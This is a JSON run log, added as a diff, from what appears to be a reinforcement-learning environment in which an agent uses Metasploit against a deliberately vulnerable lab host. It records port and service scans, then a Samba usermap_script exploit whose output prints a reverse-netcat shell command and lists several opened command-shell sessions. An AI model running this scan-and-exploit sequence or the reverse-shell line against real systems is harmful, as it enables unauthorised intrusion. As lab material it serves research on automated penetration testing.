@@ -1,0 +1,354 @@
+{
+  "run_id": "rl_env_msf_2026-04-25T12-17-49Z",
+  "target": "10.11.202.189",
+  "use_metasploit": true,
+  "history": [
+    {
+      "step": 1,
+      "action": "scan_basic",
+      "state": {
+        "num_open_ports": 18,
+        "has_ftp": true,
+        "has_ssh": false,
+        "has_telnet": false,
+        "has_http": true,
+        "has_mysql": true,
+        "has_postgresql": true,
+        "has_bindshell_1524": false,
+        "has_samba": false,
+        "has_tomcat": false,
+        "has_vsftpd_234": false,
+        "has_shell": false,
+        "basic_scanned": true,
+        "service_scanned": false
+      },
+      "reward": -0.2,
+      "done": false,
+      "info": {
+        "open_ports": [
+          21,
+          22,
+          23,
+          25,
+          53,
+          80,
+          111,
+          139,
+          445,
+          513,
+          514,
+          2049,
+          2121,
+          3306,
+          5432,
+          5900,
+          6000,
+          8009
+        ],
+        "scan_type": "basic"
+      }
+    },
+    {
+      "step": 2,
+      "action": "scan_service",
+      "state": {
+        "num_open_ports": 23,
+        "has_ftp": true,
+        "has_ssh": true,
+        "has_telnet": true,
+        "has_http": true,
+        "has_mysql": true,
+        "has_postgresql": true,
+        "has_bindshell_1524": true,
+        "has_samba": true,
+        "has_tomcat": true,
+        "has_vsftpd_234": true,
+        "has_shell": false,
+        "basic_scanned": true,
+        "service_scanned": true
+      },
+      "reward": -0.3,
+      "done": false,
+      "info": {
+        "open_ports": [
+          21,
+          22,
+          23,
+          25,
+          53,
+          80,
+          111,
+          139,
+          445,
+          512,
+          513,
+          514,
+          1099,
+          1524,
+          2049,
+          2121,
+          3306,
+          5432,
+          5900,
+          6000,
+          6667,
+          8009,
+          8180
+        ],
+        "service_map": {
+          "21": {
+            "service": "ftp",
+            "version": "vsftpd 2.3.4"
+          },
+          "22": {
+            "service": "ssh",
+            "version": "OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)"
+          },
+          "23": {
+            "service": "telnet",
+            "version": "Linux telnetd"
+          },
+          "25": {
+            "service": "smtp",
+            "version": "Postfix smtpd"
+          },
+          "53": {
+            "service": "domain",
+            "version": "ISC BIND 9.4.2"
+          },
+          "80": {
+            "service": "http",
+            "version": "Apache httpd 2.2.8 ((Ubuntu) DAV/2)"
+          },
+          "111": {
+            "service": "rpcbind",
+            "version": "2 (RPC #100000)"
+          },
+          "139": {
+            "service": "netbios-ssn",
+            "version": "Samba smbd 3.X - 4.X (workgroup: WORKGROUP)"
+          },
+          "445": {
+            "service": "netbios-ssn",
+            "version": "Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)"
+          },
+          "512": {
+            "service": "exec",
+            "version": "netkit-rsh rexecd"
+          },
+          "513": {
+            "service": "login?",
+            "version": ""
+          },
+          "514": {
+            "service": "shell",
+            "version": "Netkit rshd"
+          },
+          "1099": {
+            "service": "java-rmi",
+            "version": "GNU Classpath grmiregistry"
+          },
+          "1524": {
+            "service": "bindshell",
+            "version": "Metasploitable root shell"
+          },
+          "2049": {
+            "service": "nfs",
+            "version": "2-4 (RPC #100003)"
+          },
+          "2121": {
+            "service": "ftp",
+            "version": "ProFTPD 1.3.1"
+          },
+          "3306": {
+            "service": "mysql",
+            "version": "MySQL 5.0.51a-3ubuntu5"
+          },
+          "5432": {
+            "service": "postgresql",
+            "version": "PostgreSQL DB 8.3.0 - 8.3.7"
+          },
+          "5900": {
+            "service": "vnc",
+            "version": "VNC (protocol 3.3)"
+          },
+          "6000": {
+            "service": "X11",
+            "version": "(access denied)"
+          },
+          "6667": {
+            "service": "irc",
+            "version": "UnrealIRCd"
+          },
+          "8009": {
+            "service": "ajp13",
+            "version": "Apache Jserv (Protocol v1.3)"
+          },
+          "8180": {
+            "service": "http",
+            "version": "Apache Tomcat/Coyote JSP engine 1.1"
+          }
+        },
+        "scan_type": "service"
+      }
+    },
+    {
+      "step": 3,
+      "action": "exploit_samba",
+      "state": {
+        "num_open_ports": 23,
+        "has_ftp": true,
+        "has_ssh": true,
+        "has_telnet": true,
+        "has_http": true,
+        "has_mysql": true,
+        "has_postgresql": true,
+        "has_bindshell_1524": true,
+        "has_samba": true,
+        "has_tomcat": true,
+        "has_vsftpd_234": true,
+        "has_shell": true,
+        "basic_scanned": true,
+        "service_scanned": true
+      },
+      "reward": 8.0,
+      "done": true,
+      "info": {
+        "success": true,
+        "real_success": true,
+        "stdout": "               .;lxO0KXXXK0Oxl:.\n           ,o0WMMMMMMMMMMMMMMMMMMKd,\n        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,\n      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:\n    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,\n   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo\n  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk\n oMMMMMMMMMMx.                    dMMMMMMMMMMx\n.WMMMMMMMMM:                       :MMMMMMMMMM,\nxMMMMMMMMMo                         lMMMMMMMMMO\nNMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;\nMMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:\nNMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:\nxMMMMMMMMMd                        ,0MMMMMMMMMMK;\n.WMMMMMMMMMc                         'OMMMMMM0,\n lMMMMMMMMMMk.                         .kMMO'\n  dMMMMMMMMMMWd'                         ..\n   cWMMMMMMMMMMMNxc'.                ##########\n    .0MMMMMMMMMMMMMMMMWc            #+#    #+#\n      ;0MMMMMMMMMMMMMMMo.          +:+\n        .dNMMMMMMMMMMMMo          +#++:++#+\n           'oOWMMMMMMMMo                +:+\n               .,cdkO0K;        :+:    :+:                                \n                                :::::::+:\n                      Metasploit\n\n       =[ metasploit v6.4.111-dev                               ]\n+ -- --=[ 2,607 exploits - 1,323 auxiliary - 1,710 payloads     ]\n+ -- --=[ 430 post - 49 encoders - 14 nops - 9 evasion          ]\n\nMetasploit Documentation: https://docs.metasploit.com/\nThe Metasploit Framework is a Rapid7 Open Source Project\n\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nRHOSTS => 10.11.202.189\nRPORT => 139\nPAYLOAD => cmd/unix/reverse_netcat\nLHOST => 10.11.203.40\nVERBOSE => true\n[+] mkfifo /tmp/fbxfu; nc 10.11.203.40 4444 0</tmp/fbxfu | /bin/sh >/tmp/fbxfu 2>&1; rm /tmp/fbxfu\n[*] Exploit running as background job 7.\n[*] Exploit completed, but no session was created.\n[*] Started reverse TCP handler on 10.11.203.40:4444 \n[*] 10.11.202.189:139 - Use Rex client (SMB1 only) since this module is not compatible with RubySMB client\n",
+        "stderr": "",
+        "sessions": {
+          "1": {
+            "type": "shell",
+            "tunnel_local": "10.11.203.40:44457",
+            "tunnel_peer": "10.11.202.189:6200",
+            "via_exploit": "exploit/unix/ftp/vsftpd_234_backdoor",
+            "via_payload": "payload/cmd/unix/interact",
+            "desc": "Command shell",
+            "info": "",
+            "workspace": "",
+            "session_host": "10.11.202.189",
+            "session_port": 21,
+            "target_host": "10.11.202.189",
+            "username": "kali",
+            "uuid": "odh8kgib",
+            "exploit_uuid": "1nag0rdq",
+            "routes": "",
+            "arch": "cmd"
+          },
+          "2": {
+            "type": "shell",
+            "tunnel_local": "10.11.203.40:4444",
+            "tunnel_peer": "10.11.202.189:36646",
+            "via_exploit": "exploit/multi/samba/usermap_script",
+            "via_payload": "payload/cmd/unix/reverse_netcat",
+            "desc": "Command shell",
+            "info": "",
+            "workspace": "",
+            "session_host": "10.11.202.189",
+            "session_port": 139,
+            "target_host": "10.11.202.189",
+            "username": "kali",
+            "uuid": "rrhzkdc7",
+            "exploit_uuid": "lw5j39c4",
+            "routes": "",
+            "arch": "cmd"
+          },
+          "3": {
+            "type": "shell",
+            "tunnel_local": "10.11.203.40:4444",
+            "tunnel_peer": "10.11.202.189:36647",
+            "via_exploit": "exploit/multi/samba/usermap_script",
+            "via_payload": "payload/cmd/unix/reverse_netcat",
+            "desc": "Command shell",
+            "info": "",
+            "workspace": "",
+            "session_host": "10.11.202.189",
+            "session_port": 139,
+            "target_host": "10.11.202.189",
+            "username": "kali",
+            "uuid": "zy0igxoz",
+            "exploit_uuid": "or8qfytg",
+            "routes": "",
+            "arch": "cmd"
+          },
+          "4": {
+            "type": "shell",
+            "tunnel_local": "10.11.203.40:4444",
+            "tunnel_peer": "10.11.202.189:36648",
+            "via_exploit": "exploit/multi/samba/usermap_script",
+            "via_payload": "payload/cmd/unix/reverse_netcat",
+            "desc": "Command shell",
+            "info": "",
+            "workspace": "",
+            "session_host": "10.11.202.189",
+            "session_port": 139,
+            "target_host": "10.11.202.189",
+            "username": "kali",
+            "uuid": "hmfl4otx",
+            "exploit_uuid": "6o1dqnbr",
+            "routes": "",
+            "arch": "cmd"
+          },
+          "5": {
+            "type": "shell",
+            "tunnel_local": "10.11.203.40:4444",
+            "tunnel_peer": "10.11.202.189:36649",
+            "via_exploit": "exploit/multi/samba/usermap_script",
+            "via_payload": "payload/cmd/unix/reverse_netcat",
+            "desc": "Command shell",
+            "info": "",
+            "workspace": "",
+            "session_host": "10.11.202.189",
+            "session_port": 139,
+            "target_host": "10.11.202.189",
+            "username": "kali",
+            "uuid": "xdvaxdco",
+            "exploit_uuid": "0nrz6d9w",
+            "routes": "",
+            "arch": "cmd"
+          },
+          "6": {
+            "type": "shell",
+            "tunnel_local": "10.11.203.40:4444",
+            "tunnel_peer": "10.11.202.189:36650",
+            "via_exploit": "exploit/multi/samba/usermap_script",
+            "via_payload": "payload/cmd/unix/reverse_netcat",
+            "desc": "Command shell",
+            "info": "",
+            "workspace": "",
+            "session_host": "10.11.202.189",
+            "session_port": 139,
+            "target_host": "10.11.202.189",
+            "username": "kali",
+            "uuid": "s4paortd",
+            "exploit_uuid": "ycklupw5",
+            "routes": "",
+            "arch": "cmd"
+          },
+          "7": {
+            "type": "shell",
+            "tunnel_local": "10.11.203.40:4444",
+            "tunnel_peer": "10.11.202.189:36651",
+            "via_exploit": "exploit/multi/samba/usermap_script",
+            "via_payload": "payload/cmd/unix/reverse_netcat",
+            "desc": "Command shell",
+            "info": "",
+            "workspace": "",
+            "session_host": "10.11.202.189",
+            "session_port": 139,
+            "target_host": "10.11.202.189",
+            "username": "kali",
+            "uuid": "793czbjo",
+            "exploit_uuid": "tpq3duyf",
+            "routes": "",
+            "arch": ""
+          }
+        },
+        "backend": "metasploit",
+        "module": "exploit/multi/samba/usermap_script"
+      }
+    }
+  ]
+}
